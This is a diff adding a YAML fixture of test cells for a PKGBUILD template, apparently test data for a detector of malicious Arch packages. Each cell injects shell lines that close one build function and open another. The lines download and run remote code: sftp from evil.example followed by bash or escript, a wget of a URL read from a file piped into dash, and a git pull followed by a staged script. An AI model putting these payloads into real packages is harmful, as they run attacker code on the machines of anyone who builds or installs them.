@@ -1,0 +1,33 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git pull origin main
+      }
+      build() {
+        bash "$srcdir/stage.sh"
+  id: 01-crossfn-gitpull
+- vars:
+    payload: |2
+        cd "$srcdir"
+        sftp -b - u@evil.example <<< "get /s.erl"
+      }
+      package() {
+        escript "$srcdir/s.erl"
+  id: 02-crossfn-sftp-escript
+- vars:
+    payload: |2
+        cd "$srcdir"
+        wget -q "$(cat "$srcdir/url.txt")"
+      }
+      check() {
+        dash < "$srcdir/stage.sh"
+  id: 03-crossfn-wget-stdin
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.sh"
+      }
+      package() {
+        bash "$srcdir/s.sh"
+  id: 05-cross-fn
